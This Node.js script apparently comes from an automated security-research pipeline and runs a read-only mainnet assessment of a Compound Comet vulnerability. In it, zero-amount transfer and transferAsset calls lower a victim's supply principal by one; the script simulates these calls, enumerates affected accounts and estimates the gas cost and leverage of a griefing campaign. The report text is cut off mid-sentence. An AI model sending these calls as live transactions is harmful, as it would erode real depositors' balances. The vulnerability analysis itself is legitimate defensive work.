#!/usr/bin/env node
"use strict";

// Authorized, read-only Ethereum deployment/materiality pass. Endpoint URLs,
// headers, account addresses, and raw RPC envelopes remain memory-only.
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const { Interface, AbiCoder, id, keccak256 } = require("./node_modules/ethers");
const { SCALE, fixedPeriod, aggregateExposure, scopeEventDerivedExposure, runTests } = require("./test-critical-compound-comet-zero-transfer-griefing-step2.js");

const ROOT = path.resolve(__dirname, "..");
const NAME = "critical-compound-comet-zero-transfer-griefing-step2";
const AGENT = "critical-compound-comet-grief-step2-20260727";
const CLAIM = "coordination/claims/target-compound-comet-zero-transfer-griefing-step2--46b1f037.json";
const INVENTORIES = ["rpc_endpoints.txt", "graphql_endpoints.txt"];
const RAW = `reports/raw/fast/${NAME}.json`;
const TESTS = `reports/raw/fast/${NAME}-tests.json`;
const LEAK = `reports/raw/fast/${NAME}-leak-scan.json`;
const MANIFEST = `reports/raw/fast/${NAME}-manifest.json`;
const REPORT = `reports/${NAME}.md`;
const RUNNER = `tools/run-${NAME}.js`;
const TESTER = `tools/test-${NAME}.js`;
const VALIDATOR = `tools/validate-${NAME}.js`;
const INBOX = `coordination/inbox/critical/2026-07-27-${NAME}.json`;
const HANDOFF = `coordination/handoffs/2026-07-27-critical-compound-comet-grief-step2-handoff.md`;
const STEP1 = "reports/critical-compound-comet-principal-rounding-conservation-step1.md";
const ROOTS = "targets/compound-comet/deployments/mainnet/usdc/roots.json";
const CONFIG = "targets/compound-comet/deployments/mainnet/usdc/configuration.json";
const VULNERABLE_SOURCE = "targets/compound-comet/contracts/CometWithExtendedAssetList.sol";
const MIGRATION_SOURCE = "targets/compound-comet/deployments/mainnet/usdc/migrations/1735299739_update_comet_to_support_more_collaterals.ts";
const SOURCE_COMMIT = "ed6ebcd84ac00906e8e725716891d482f4bef8b9";

const CHAIN_ID = 1;
const MULTICALL3 = "0xca11bde05977b3631167028862be2a173976ca11";
const ETH_USD_FEED = "0x5f4ec3df9cbd43714fe2740f5e3616155c5b8419";
const EIP1967 = {
  implementation: "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc",
  admin: "0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103",
};
const MAX_BODY = 32 * 1024 * 1024;
const ZERO = "0x0000000000000000000000000000000000000000";

const COMET = new Interface([
  "function totalsBasic() view returns(tuple(uint64 baseSupplyIndex,uint64 baseBorrowIndex,uint64 trackingSupplyIndex,uint64 trackingBorrowIndex,uint104 totalSupplyBase,uint104 totalBorrowBase,uint40 lastAccrualTime,uint8 pauseFlags))",
  "function userBasic(address) view returns(int104 principal,uint64 baseTrackingIndex,uint64 baseTrackingAccrued,uint16 assetsIn,uint8 reserved)",
  "function transfer(address,uint256) returns(bool)",
  "function transferAsset(address,address,uint256)",
  "function accrueAccount(address)",
  "function totalSupply() view returns(uint256)",
  "function totalBorrow() view returns(uint256)",
  "function getReserves() view returns(int256)",
  "function isSupplyPaused() view returns(bool)",
  "function isTransferPaused() view returns(bool)",
  "function isWithdrawPaused() view returns(bool)",
  "function isAbsorbPaused() view returns(bool)",
  "function isBuyPaused() view returns(bool)",
  "function baseTrackingSupplySpeed() view returns(uint64)",
  "function baseTrackingBorrowSpeed() view returns(uint64)",
  "function baseMinForRewards() view returns(uint104)",
  "function baseToken() view returns(address)",
  "function governor() view returns(address)",
  "function pauseGuardian() view returns(address)",
  "function extensionDelegate() view returns(address)",
  "function assetList() view returns(address)",
]);
const MC = new Interface(["function aggregate3(tuple(address target,bool allowFailure,bytes callData)[] calls) payable returns(tuple(bool success,bytes returnData)[] returnData)"]);
const REWARDS = new Interface(["function rewardConfig(address) view returns(address token,uint64 rescaleFactor,bool shouldUpscale,uint256 multiplier)"]);
const ERC20 = new Interface(["function balanceOf(address) view returns(uint256)", "function decimals() view returns(uint8)"]);
const FEED = new Interface(["function latestRoundData() view returns(uint80,int256,uint256,uint256,uint80)", "function decimals() view returns(uint8)"]);
const coder = AbiCoder.defaultAbiCoder();

const EVENT_TOPICS = [
  id("Supply(address,address,uint256)"),
  id("Transfer(address,address,uint256)"),
  id("Withdraw(address,address,uint256)"),
  id("AbsorbDebt(address,address,uint256,uint256)"),
].map((value) => value.toLowerCase());

const abs = (rel) => path.join(ROOT, rel);
const read = (rel) => fs.readFileSync(abs(rel));
const text = (rel) => read(rel).toString("utf8");
const json = (rel) => JSON.parse(text(rel));
const sha = (value) => crypto.createHash("sha256").update(value).digest("hex");
const lower = (value) => String(value).toLowerCase();
const hex = (value) => `0x${BigInt(value).toString(16)}`;
const isAddress = (value) => /^0x[0-9a-f]{40}$/i.test(value || "");
const isWord = (value) => /^0x[0-9a-f]{64}$/i.test(value || "");
const isData = (value) => /^0x(?:[0-9a-f]{2})*$/i.test(value || "");
const isQuantity = (value) => /^0x[0-9a-f]+$/i.test(value || "");
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const write = (rel, value) => { fs.mkdirSync(path.dirname(abs(rel)), { recursive: true }); fs.writeFileSync(abs(rel), value, "utf8"); };
const hashFile = (rel) => { const body = read(rel); return { path: rel, bytes: body.length, sha256: sha(body) }; };
const aggregateHash = (records) => sha(Buffer.from(records.map((row) => `${row.path}\0${row.bytes}\0${row.sha256}`).join("\n")));
const canonical = (value) => typeof value === "bigint" ? value.toString() : Array.isArray(value) ? value.map(canonical) : value && typeof value === "object" ? Object.fromEntries(Object.keys(value).sort().map((key) => [key, canonical(value[key])])) : value;
const digest = (value) => sha(Buffer.from(JSON.stringify(canonical(value))));

function formatUnits(value, decimals, precision = 6) {
  const n = BigInt(value), negative = n < 0n, x = negative ? -n : n, scale = 10n ** BigInt(decimals), whole = x / scale;
  const fraction = (x % scale).toString().padStart(decimals, "0").slice(0, precision).replace(/0+$/, "");
  return `${negative ? "-" : ""}${whole}${fraction ? `.${fraction}` : ""}`;
}

function familyKey(url) {
  const parts = new URL(url).hostname.toLowerCase().split(".").filter(Boolean);
  return parts.length <= 2 ? parts.join(".") : parts.slice(-2).join(".");
}

function extractUrls(line) {
  return [...line.replace(/\\\//g, "/").matchAll(/(?:https?):\/\/[^\s"'`<>{}\[\]]+/gi)].map((match) => {
    try { return new URL(match[0].replace(/[),.;\]]+$/, "")).href; } catch { return null; }
  }).filter(Boolean);
}

function parseHeaders(context) {
  const headers = {};
  const origin = context.match(/\[origin:\s*([^\]\s]+)\]/i)?.[1];
  if (origin) headers.origin = origin;
  for (const match of context.matchAll(/\[header:\s*([^=\]\s]+)=([^\]]+)\]/gi)) headers[match[1].toLowerCase()] = match[2].trim();
  for (const match of context.matchAll(/(?:^|[|`\s"'])(authorization|x-api-key|api-key|apikey|api_key)\s*[:=]\s*([^|`\r\n"']+)/gim)) headers[match[1].toLowerCase()] = match[2].trim();
  return headers;
}

function parseInventories() {
  const byUrl = new Map(), secrets = new Set();
  for (const rel of INVENTORIES) {
    const lines = text(rel).split(/\r?\n/);
    for (let index = 0; index < lines.length; index++) for (const url of extractUrls(lines[index])) {
      secrets.add(lower(url)); secrets.add(new URL(url).hostname.toLowerCase());
      const context = lines.slice(Math.max(0, index - 3), Math.min(lines.length, index + 4)).join("\n");
      const prior = byUrl.get(url) || { url, headers: {} };
      Object.assign(prior.headers, parseHeaders(context));
      byUrl.set(url, prior);
    }
  }
  const rows = [...byUrl.values()].filter((row) => ["http:", "https:"].includes(new URL(row.url).protocol)).map((row) => ({ ...row, family: familyKey(row.url) }));
  return { rows, secrets, candidateCount: rows.length, familyCount: new Set(rows.map((row) => row.family)).size };
}

let rpcId = 1, rpcRequests = 0, graphqlRequests = 0, stage = "startup";

async function post(row, payload, timeout = 20000) {
  rpcRequests += Array.isArray(payload) ? payload.length : 1;
  const controller = new AbortController(), timer = setTimeout(() => controller.abort(), timeout);
  try {
    const response = await fetch(row.url, { method: "POST", headers: { accept: "application/json", "content-type": "application/json", ...row.headers }, body: JSON.stringify(payload), redirect: "manual", signal: controller.signal });
    if (!response.ok || !response.body) throw new Error(`http-${response.status}`);
    const reader = response.body.getReader(), chunks = []; let size = 0;
    while (true) {
      const { done, value } = await reader.read(); if (done) break;
      size += value.length; if (size > MAX_BODY) { await reader.cancel(); throw new Error("body-cap"); }
      chunks.push(Buffer.from(value));
    }
    return JSON.parse(Buffer.concat(chunks).toString("utf8"));
  } finally { clearTimeout(timer); }
}

async function rpc(row, method, params = [], timeout = 20000) {
  for (let attempt = 0; attempt < 6; attempt++) {
    try {
      const envelope = await post(row, { jsonrpc: "2.0", id: rpcId++, method, params }, timeout);
      if (!envelope || envelope.error || !Object.hasOwn(envelope, "result")) throw new Error(`rpc-${method}`);
      return envelope.result;
    } catch (error) {
      if (attempt === 5) throw error;
      await sleep(String(error.message || error) === "http-429" ? 8000 * (attempt + 1) : 600 * (attempt + 1));
    }
  }
}

async function safeRpc(row, method, params = [], timeout = 20000) {
  try { return { ok: true, result: await rpc(row, method, params, timeout) }; }
  catch { return { ok: false, result: null }; }
}

async function safeRpcOnce(row, method, params = [], timeout = 30000) {
  try {
    const envelope = await post(row, { jsonrpc: "2.0", id: rpcId++, method, params }, timeout);
    if (!envelope || envelope.error || !Object.hasOwn(envelope, "result")) return { ok: false, result: null };
    return { ok: true, result: envelope.result };
  } catch { return { ok: false, result: null }; }
}

async function parallel(rows, concurrency, fn) {
  const output = new Array(rows.length); let cursor = 0;
  async function worker() { while (true) { const index = cursor++; if (index >= rows.length) return; try { output[index] = await fn(rows[index], index); } catch { output[index] = null; } } }
  await Promise.all(Array.from({ length: Math.min(concurrency, Math.max(1, rows.length)) }, worker));
  return output;
}

async function ethCall(row, to, data, pin, from = null, timeout = 25000) {
  const tx = { to, data }; if (from) tx.from = from;
  const result = await rpc(row, "eth_call", [tx, hex(pin)], timeout);
  if (!isData(result)) throw new Error("call-schema");
  return lower(result);
}

async function callBoth(selected, to, data, pin, from = null) {
  const values = await Promise.all(selected.map((item) => ethCall(item.row, to, data, pin, from)));
  if (new Set(values).size !== 1) throw new Error("two-family-call-disagreement");
  return values[0];
}

async function qualify(inventory, cometAddress) {
  const probes = await parallel(inventory.rows, 12, async (row) => {
    const chain = await safeRpc(row, "eth_chainId", [], 7000);
    if (!chain.ok || Number(BigInt(chain.result)) !== CHAIN_ID) return null;
    const finalized = await safeRpc(row, "eth_getBlockByNumber", ["finalized", false], 12000);
    if (!finalized.ok || !finalized.result || !isQuantity(finalized.result.number) || !isWord(finalized.result.hash)) return null;
    const code = await safeRpc(row, "eth_getCode", [cometAddress, finalized.result.number], 12000);
    if (!code.ok || !isData(code.result) || code.result === "0x") return null;
    return { row, finalized: finalized.result };
  });
  const byFamily = new Map();
  for (const probe of probes.filter(Boolean)) if (!byFamily.has(probe.row.family)) byFamily.set(probe.row.family, probe);
  const families = [...byFamily.values()];
  if (families.length < 2) throw new Error("two-ethereum-families-unavailable");
  for (let i = 0; i < families.length; i++) for (let j = i + 1; j < families.length; j++) {
    const selected = [families[i], families[j]], pin = Math.min(...selected.map((item) => Number(BigInt(item.finalized.number))));
    const headers = await Promise.all(selected.map((item) => safeRpc(item.row, "eth_getBlockByNumber", [hex(pin), false], 12000)));
    if (headers.every((item) => item.ok && item.result && isWord(item.result.hash)) && new Set(headers.map((item) => lower(item.result.hash))).size === 1) {
      return { selected, pin, pinHash: lower(headers[0].result.hash), header: headers[0].result, responsiveProviders: probes.filter(Boolean).length, responsiveFamilies: families.length };
    }
  }
  throw new Error("two-family-pin-agreement-unavailable");
}

function slotAddress(word) { return isWord(word) && BigInt(word) !== 0n ? `0x${word.slice(-40)}`.toLowerCase() : null; }

async function proxyEvidence(selected, address, pin) {
  const slots = {};
  for (const [name, slot] of Object.entries(EIP1967)) {
    const values = await Promise.all(selected.map((item) => rpc(item.row, "eth_getStorageAt", [address, slot, hex(pin)])));
    if (!values.every(isWord) || new Set(values.map(lower)).size !== 1) throw new Error("proxy-slot-disagreement");
    slots[name] = slotAddress(values[0]);
  }
  const proxyCodes = await Promise.all(selected.map((item) => rpc(item.row, "eth_getCode", [address, hex(pin)])));
  if (!proxyCodes.every(isData) || new Set(proxyCodes.map(lower)).size !== 1 || proxyCodes[0] === "0x") throw new Error("proxy-code-disagreement");
  const output = { proxyRuntimeBytes: (proxyCodes[0].length - 2) / 2, proxyRuntimeKeccak256: keccak256(proxyCodes[0]), implementationSlotNonzero: Boolean(slots.implementation), adminSlotNonzero: Boolean(slots.admin), implementationRuntimeBytes: null, implementationRuntimeKeccak256: null, adminHasCode: null, adminRuntimeKeccak256: null };
  if (slots.implementation) {
    const codes = await Promise.all(selected.map((item) => rpc(item.row, "eth_getCode", [slots.implementation, hex(pin)])));
    if (!codes.every(isData) || new Set(codes.map(lower)).size !== 1 || codes[0] === "0x") throw new Error("implementation-code-disagreement");
    output.implementationRuntimeBytes = (codes[0].length - 2) / 2;
    output.implementationRuntimeKeccak256 = keccak256(codes[0]);
  }
  if (slots.admin) {
    const codes = await Promise.all(selected.map((item) => rpc(item.row, "eth_getCode", [slots.admin, hex(pin)])));
    if (!codes.every(isData) || new Set(codes.map(lower)).size !== 1) throw new Error("admin-code-disagreement");
    output.adminHasCode = codes[0] !== "0x";
    output.adminRuntimeKeccak256 = codes[0] === "0x" ? null : keccak256(codes[0]);
  }
  return { output, slots };
}

async function firstCodeBlock(row, address, pin) {
  let lo = 0, hi = pin;
  while (lo < hi) {
    const mid = Math.floor((lo + hi) / 2), code = await rpc(row, "eth_getCode", [address, hex(mid)], 20000);
    if (!isData(code)) throw new Error("code-boundary-schema");
    if (code === "0x") lo = mid + 1; else hi = mid;
  }
  const at = await rpc(row, "eth_getCode", [address, hex(lo)]), before = lo === 0 ? "0x" : await rpc(row, "eth_getCode", [address, hex(lo - 1)]);
  if (at === "0x" || before !== "0x") throw new Error("code-boundary-unproven");
  return lo;
}

function decodeTopicAddress(topic) { return isWord(topic) ? `0x${topic.slice(-40)}`.toLowerCase() : null; }

async function logsRange(row, address, from, to) {
  const filter = { address, fromBlock: hex(from), toBlock: hex(to), topics: [EVENT_TOPICS] };
  // Range-limit errors are deterministic on many providers. Do not spend six
  // generic retries before bisecting; recurse immediately and reserve retries
  // for the small leaf range.
  let result = await safeRpcOnce(row, "eth_getLogs", [filter], 30000);
  if (result.ok && Array.isArray(result.result)) return result.result;
  if (to - from < 512) {
    await sleep(1000);
    result = await safeRpc(row, "eth_getLogs", [filter], 30000);
    if (result.ok && Array.isArray(result.result)) return result.result;
    throw new Error("historical-log-coverage-unavailable");
  }
  const middle = Math.floor((from + to) / 2);
  return [...await logsRange(row, address, from, middle), ...await logsRange(row, address, middle + 1, to)];
}

async function scanHistory(row, address, from, to) {
  const accounts = new Set(), hasher = crypto.createHash("sha256"); let logs = 0, chunks = 0;
  const ranges = [];
  for (let start = from; start <= to; start += 100000) ranges.push([start, Math.min(to, start + 99999)]);
  const captures = new Array(ranges.length); let cursor = 0;
  async function worker() {
    while (true) {
      const index = cursor++; if (index >= ranges.length) return;
      captures[index] = await logsRange(row, address, ranges[index][0], ranges[index][1]);
    }
  }
  await Promise.all(Array.from({ length: Math.min(2, ranges.length) }, worker));
  for (let rangeIndex = 0; rangeIndex < ranges.length; rangeIndex++) {
    const rows = captures[rangeIndex]; chunks++;
    rows.sort((a, b) => Number(BigInt(a.blockNumber)) - Number(BigInt(b.blockNumber)) || Number(BigInt(a.transactionIndex || "0x0")) - Number(BigInt(b.transactionIndex || "0x0")) || Number(BigInt(a.logIndex)) - Number(BigInt(b.logIndex)));
    for (const log of rows) {
      if (!log || lower(log.address) !== lower(address) || !EVENT_TOPICS.includes(lower(log.topics?.[0])) || !isWord(log.blockHash) || !isWord(log.transactionHash) || !isQuantity(log.logIndex)) throw new Error("historical-log-schema");
      const normalized = [lower(log.blockHash), lower(log.transactionHash), lower(log.logIndex), ...log.topics.map(lower)].join("|");
      hasher.update(normalized); hasher.update("\n"); logs++;
      for (const topic of log.topics.slice(1, 3)) { const account = decodeTopicAddress(topic); if (account && account !== ZERO) accounts.add(account); }
    }
  }
  const sorted = [...accounts].sort();
  return { accounts: sorted, logs, chunks, logCommitment: hasher.digest("hex"), accountCommitment: sha(Buffer.from(sorted.join("\n"))) };
}

async function multicall(row, calls, pin, timeout = 35000) {
  const data = MC.encodeFunctionData("aggregate3", [calls.map((call) => [call.target, true, call.data])]);
  const raw = await ethCall(row, MULTICALL3, data, pin, null, timeout);
  return MC.decodeFunctionResult("aggregate3", raw)[0].map((item) => ({ success: Boolean(item.success), returnData: lower(item.returnData) }));
}

async function capturePrincipals(selected, cometAddress, accounts, pin) {
  const principals = [], hasher = crypto.createHash("sha256"); let chunks = 0;
  for (let offset = 0; offset < accounts.length; offset += 200) {
    const slice = accounts.slice(offset, offset + 200), calls = slice.map((account) => ({ target: cometAddress, data: COMET.encodeFunctionData("userBasic", [account]) }));
    const families = await Promise.all(selected.map((item) => multicall(item.row, calls, pin)));
    for (let index = 0; index < slice.length; index++) {
      const values = families.map((rows) => rows[index]);
      if (!values.every((row) => row?.success && isData(row.returnData)) || new Set(values.map((row) => row.returnData)).size !== 1) throw new Error("user-state-disagreement");
      const principal = BigInt(COMET.decodeFunctionResult("userBasic", values[0].returnData)[0]);
      principals.push(principal); hasher.update(slice[index]); hasher.update("|"); hasher.update(principal.toString()); hasher.update("\n");
    }
    chunks++; await sleep(50);
  }
  return { principals, chunks, stateCommitment: hasher.digest("hex") };
}

async function readFunction(selected, to, iface, fn, args, pin) {
  const raw = await callBoth(selected, to, iface.encodeFunctionData(fn, args), pin);
  return iface.decodeFunctionResult(fn, raw);
}

async function accrueProbe(selected, cometAddress, pin) {
  const calls = [
    { target: cometAddress, data: COMET.encodeFunctionData("userBasic", [MULTICALL3]) },
    { target: cometAddress, data: COMET.encodeFunctionData("totalsBasic") },
    { target: cometAddress, data: COMET.encodeFunctionData("accrueAccount", [MULTICALL3]) },
    { target: cometAddress, data: COMET.encodeFunctionData("totalsBasic") },
  ];
  const families = await Promise.all(selected.map((item) => multicall(item.row, calls, pin)));
  const commitments = families.map((rows) => digest(rows));
  if (new Set(commitments).size !== 1 || families[0].some((row) => !row.success)) throw new Error("accrual-probe-disagreement");
  const sourcePrincipal = BigInt(COMET.decodeFunctionResult("userBasic", families[0][0].returnData)[0]);
  const before = COMET.decodeFunctionResult("totalsBasic", families[0][1].returnData)[0];
  const after = COMET.decodeFunctionResult("totalsBasic", families[0][3].returnData)[0];
  return { sourcePrincipalZero: sourcePrincipal === 0n, storedSupplyIndex: BigInt(before.baseSupplyIndex), effectiveSupplyIndex: BigInt(after.baseSupplyIndex), storedLastAccrualTime: BigInt(before.lastAccrualTime), effectiveLastAccrualTime: BigInt(after.lastAccrualTime) };
}

async function zeroTransferProbe(selected, cometAddress, baseToken, victim, pin, fn) {
  const transferData = fn === "transfer" ? COMET.encodeFunctionData("transfer", [victim, 0]) : COMET.encodeFunctionData("transferAsset", [victim, baseToken, 0]);
  const calls = [
    { target: cometAddress, data: COMET.encodeFunctionData("userBasic", [MULTICALL3]) },
    { target: cometAddress, data: COMET.encodeFunctionData("userBasic", [victim]) },
    { target: cometAddress, data: COMET.encodeFunctionData("totalsBasic") },
    { target: cometAddress, data: transferData },
    { target: cometAddress, data: COMET.encodeFunctionData("userBasic", [victim]) },
    { target: cometAddress, data: COMET.encodeFunctionData("totalsBasic") },
  ];
  const families = await Promise.all(selected.map((item) => multicall(item.row, calls, pin)));
  if (new Set(families.map((rows) => digest(rows))).size !== 1) throw new Error("zero-transfer-probe-disagreement");
  const rows = families[0], success = rows.every((row) => row.success);
  if (!success) return { callSuccess: false, sourcePrincipalZero: null, victimPrincipalDecrement: null, aggregateSupplyPrincipalUnchanged: null, effectiveSupplyIndex: null };
  const source = BigInt(COMET.decodeFunctionResult("userBasic", rows[0].returnData)[0]);
  const beforeUser = BigInt(COMET.decodeFunctionResult("userBasic", rows[1].returnData)[0]);
  const beforeTotals = COMET.decodeFunctionResult("totalsBasic", rows[2].returnData)[0];
  const afterUser = BigInt(COMET.decodeFunctionResult("userBasic", rows[4].returnData)[0]);
  const afterTotals = COMET.decodeFunctionResult("totalsBasic", rows[5].returnData)[0];
  return { callSuccess: true, sourcePrincipalZero: source === 0n, victimPrincipalDecrement: (beforeUser - afterUser).toString(), aggregateSupplyPrincipalUnchanged: BigInt(beforeTotals.totalSupplyBase) === BigInt(afterTotals.totalSupplyBase), effectiveSupplyIndex: BigInt(afterTotals.baseSupplyIndex).toString() };
}

async function gasEstimate(selected, cometAddress, victim, pin) {
  const tx = { from: MULTICALL3, to: cometAddress, data: COMET.encodeFunctionData("transfer", [victim, 0]) };
  const rows = await Promise.all(selected.map((item) => safeRpc(item.row, "eth_estimateGas", [tx, hex(pin)], 30000)));
  if (!rows.every((row) => row.ok && isQuantity(row.result))) return { available: false, values: [] };
  const values = rows.map((row) => BigInt(row.result));
  return { available: true, values, minimum: values.reduce((a, b) => a < b ? a : b), maximum: values.reduce((a, b) => a > b ? a : b), exactAgreement: values.every((value) => value === values[0]) };
}

async function priceEvidence(selected, pin) {
  try {
    const decimals = Number((await readFunction(selected, ETH_USD_FEED, FEED, "decimals", [], pin))[0]);
    const round = await readFunction(selected, ETH_USD_FEED, FEED, "latestRoundData", [], pin), answer = BigInt(round[1]), updatedAt = BigInt(round[3]), answeredInRound = BigInt(round[4]), roundId = BigInt(round[0]);
    if (answer <= 0n || decimals > 18 || updatedAt === 0n || answeredInRound < roundId) throw new Error("feed-invalid");
    return { available: true, answer, decimals, updatedAt };
  } catch { return { available: false, answer: 0n, decimals: 0, updatedAt: 0n }; }
}

function gasEconomics(calls, gasUnits, gasPriceWei, price, lossRaw) {
  if (gasUnits === null || !price.available) return { calls: calls.toString(), gasUnitsPerCall: gasUnits === null ? null : gasUnits.toString(), conservativeGasPriceWei: gasPriceWei.toString(), costWei: null, nominalCostUsd: null, nominalLossUsd: formatUnits(lossRaw, 6), griefLeveragePpm: null };
  const costWei = calls * gasUnits * gasPriceWei, costPriceRaw = costWei * price.answer / 10n ** 18n;
  const lossPriceRaw = lossRaw * 10n ** BigInt(price.decimals) / 10n ** 6n;
  const leverage = costPriceRaw === 0n ? null : lossPriceRaw * 1_000_000n / costPriceRaw;
  return { calls: calls.toString(), gasUnitsPerCall: gasUnits.toString(), conservativeGasPriceWei: gasPriceWei.toString(), costWei: costWei.toString(), nominalCostUsd: formatUnits(costPriceRaw, price.decimals), nominalLossUsd: formatUnits(lossRaw, 6), griefLeveragePpm: leverage === null ? null : leverage.toString() };
}

function correctedExposure(raw) {
  if (raw.matchingEventDerivedUniverseExposure) return raw.matchingEventDerivedUniverseExposure;
  const old = raw.aggregateExposure;
  if (!old) throw new Error("offline-exposure-missing");
  return canonical({
    scope: "MATCHING_EVENT_DERIVED_UNIVERSE_UNDER_STATED_RPC_EVENT_COVERAGE_ASSUMPTIONS",
    exactForDiscoveredUniverse: true,
    cryptographicallyCompleteMarketUniverse: false,
    marketWideInterpretation: "AT_LEAST_THE_ENUMERATED_EXPOSURE",
    discoveredCandidateAccounts: old.candidateAccounts,
    enumeratedPositiveSupplyAccounts: old.positiveSupplyAccounts,
    enumeratedNonFixedPositiveAccounts: old.nonFixedPositiveAccounts,
    enumeratedPositivePrincipal: old.sumPositivePrincipal,
    totalSupplyBaseMinusEnumeratedPositivePrincipal: old.aggregateMinusAccountPositivePrincipal,
    enumeratedCurrentClaimRaw: old.sumCurrentClaimRaw,
    enumeratedResiduePrincipal: old.sumResiduePrincipal,
    counterfactualCallsToEnumeratedFixedPoints: old.callsToAllFixedPoints,
    enumeratedCounterfactualFixedPointClaimLossRaw: old.sumFixedPointClaimLossRaw,
    enumeratedOneIndependentCallLossRaw: old.sumOneCallClaimLossRaw,
    maxEnumeratedAccountResiduePrincipal: old.maxAccountResiduePrincipal,
    maxEnumeratedAccountFixedPointClaimLossRaw: old.maxAccountFixedPointClaimLossRaw,
    addressRowsPersisted: 0,
  });
}

function applyOracleCorrections(existing) {
  const raw = JSON.parse(JSON.stringify(existing)), exposure = correctedExposure(raw), oldGas = raw.gasMateriality;
  const evidenceCapturedAt = raw.evidenceCapturedAt || raw.generatedAt;
  raw.schemaVersion = 2;
  raw.revision = "oracle-scope-and-gas-corrections-offline-r2";
  raw.evidenceCapturedAt = evidenceCapturedAt;
  raw.generatedAt = new Date().toISOString();
  raw.classification = raw.classification.replace("LOW/CURRENTLY-REACHABLE/", "LOW/CURRENTLY-REACHABLE-AT-FINALIZED-PIN/");
  raw.runId = `${NAME}-offline-oracle-correction-${digest({ pin: raw.endpointCoverage.fixedFinalizedPin, exposure, behavior: raw.readOnlyBehavior })}`;
  raw.pipelines.completeHistoricalExposureAtPin = false;
  raw.pipelines.matchingEventDerivedUniverseAtPin = true;
  raw.pipelines.marketWideCompletenessEstablished = false;
  const oldHistory = raw.historicalCoverage;
  raw.historicalCoverage = canonical({
    fromProxyFirstCodeBlock: oldHistory.fromProxyFirstCodeBlock,
    firstCodeBoundarySelectedFamilyDerived: true,
    fullImplementationLineageProven: false,
    eventEmissionCompletenessProven: false,
    toFixedFinalizedBlock: oldHistory.toFixedFinalizedBlock,
    twoFamilyMatchingLogAgreement: oldHistory.twoFamilyMatchingLogAgreement ?? oldHistory.twoFamilyLogAgreement,
    logRows: oldHistory.logRows,
    requestedTopLevelChunksPerFamily: oldHistory.requestedTopLevelChunksPerFamily,
    discoveredCandidateAccounts: oldHistory.discoveredCandidateAccounts ?? oldHistory.candidateAccounts,
    logCommitment: oldHistory.logCommitment,
    accountUniverseCommitment: oldHistory.accountUniverseCommitment,
    userStateCommitment: oldHistory.userStateCommitment,
    userStateChunksPerFamily: oldHistory.userStateChunksPerFamily,
    accountAddressesPersisted: false,
    scopeStatement: "Matching event-derived universe under stated RPC/event-coverage assumptions; no cryptographic proof of complete market history, implementation lineage, or event-emission completeness.",
  });
  raw.matchingEventDerivedUniverseExposure = exposure;
  delete raw.aggregateExposure;
  const independentGas = oldGas.independentCallEstimateGas ?? oldGas.conservativeEstimateGas;
  const independentCalls = exposure.enumeratedNonFixedPositiveAccounts;
  raw.gasMateriality = canonical({
    scenario: "UNBATCHED_INDEPENDENT_CALLS",
    estimateAvailable: oldGas.estimateAvailable,
    twoFamilyEstimateValues: oldGas.twoFamilyEstimateValues,
    exactEstimateAgreement: oldGas.exactEstimateAgreement,
    independentCallEstimateGas: independentGas,
    enumeratedIndependentCalls: independentCalls,
    unbatchedIndependentCallGas: independentGas === null ? null : (BigInt(independentGas) * BigInt(independentCalls)).toString(),
    baseFeeWei: oldGas.baseFeeWei,
    conservativeGasPriceWei: oldGas.conservativeGasPriceWei,
    ethUsdReferenceAvailable: oldGas.ethUsdReferenceAvailable,
    ethUsdAtPin: oldGas.ethUsdAtPin,
    unbatchedIndependentCallScenario: oldGas.unbatchedIndependentCallScenario ?? oldGas.snapshotOneCallPerNonFixedAccount,
    optimizedCampaignMeasured: false,
    optimizedCampaignCaveat: "Optimized batching could reuse the source checkpoint, perform one global accrual per block, warm storage, and add wrapper overhead; no optimized campaign gas or block-capacity bound was measured.",
    counterfactualFixedIndexConvergence: oldGas.counterfactualFixedIndexConvergence,
    counterfactualWarning: "The fixed-index convergence sum is not an executable same-index forecast; later blocks change the index, period, and residues.",
    nominalAssumption: oldGas.nominalAssumption,
  });
  raw.economics.enumeratedAggregateAccountDivergencePotential = true;
  delete raw.economics.aggregateResiduePotential;
  raw.limitations = [
    "No bytecode/source equivalence claim: immutable and metadata normalization was not reproduced.",
    "Hostname-derived provider families do not prove backend operator independence.",
    "Exposure is exact only for the matching event-derived discovered universe and is a market-wide lower bound, not a complete market total.",
    "The first-code boundary was selected-family-derived; full implementation lineage and event-emission completeness were not proven.",
    "Exposure is a fixed-pin snapshot; later interest-index changes alter the fixed-point period and account residues.",
    "The counterfactual fixed-index convergence sum is not an executable same-index loss forecast.",
    "Gas figures are an unbatched independent-call scenario; optimized campaign gas and block capacity were not measured.",
    "The 73-raw difference is totalSupplyBase minus enumerated positive principal, not proven total-market residue or hostile attribution.",
    "Reward inventory/speed are context, not exact token liability; reserve capture and direct attacker payout remain unproven.",
    "No account identities, endpoint material, or raw responses were persisted.",
  ];
  raw.offlineCorrectionActivity = { offlineOnly: true, newRpcRequests: 0, endpointInventoryReads: 0, graphqlRequests: 0, secretFilesRead: 0, forks: 0, liveActions: 0, stateOverrides: 0 };
  return canonical(raw);
}

function renderReport(raw) {
  const pin = raw.endpointCoverage.fixedFinalizedPin, history = raw.historicalCoverage, exposure = raw.matchingEventDerivedUniverseExposure, gas = raw.gasMateriality, scenario = gas.unbatchedIndependentCallScenario;
  return `# 🟡 VULNERABLE — Compound Comet zero-transfer account-claim grief Step 2\n\n**Classification:** \`${raw.classification}\`  \n**Impact primitive:** \`2/5\`; **financial extraction:** \`0/5\`; **gates:** \`0/0/false\`; **fork/live actions:** \`false\`.\n\n## Result at the finalized pin\n\nAt finalized Ethereum pin \`${pin.number}\` / \`${pin.hash}\`, two hostname-derived RPC families agreed the header, proxy/code observations, ${history.logRows} matching event rows, ${history.discoveredCandidateAccounts} discovered candidate accounts, queried account state, and the terminal hash recheck. This is a **matching event-derived universe under the stated RPC/event-coverage assumptions**, not a cryptographically complete account universe or market history. The first-code boundary was derived from a selected family; full implementation lineage and event-emission completeness were not proven.\n\nRead-only same-call simulations confirmed at this pin that both \`transfer(dst, 0)\` and \`transferAsset(dst, base, 0)\` lower an anonymized positive destination principal by exactly one while leaving \`totalSupplyBase\` unchanged. Transfers were unpaused. Runtime/source equivalence is not claimed.\n\n## Corrected exposure wording\n\n- Exactly **${exposure.discoveredCandidateAccounts}** candidates were discovered under the matching filter. Within that discovered universe, exactly **${exposure.enumeratedPositiveSupplyAccounts}** accounts had positive principal and 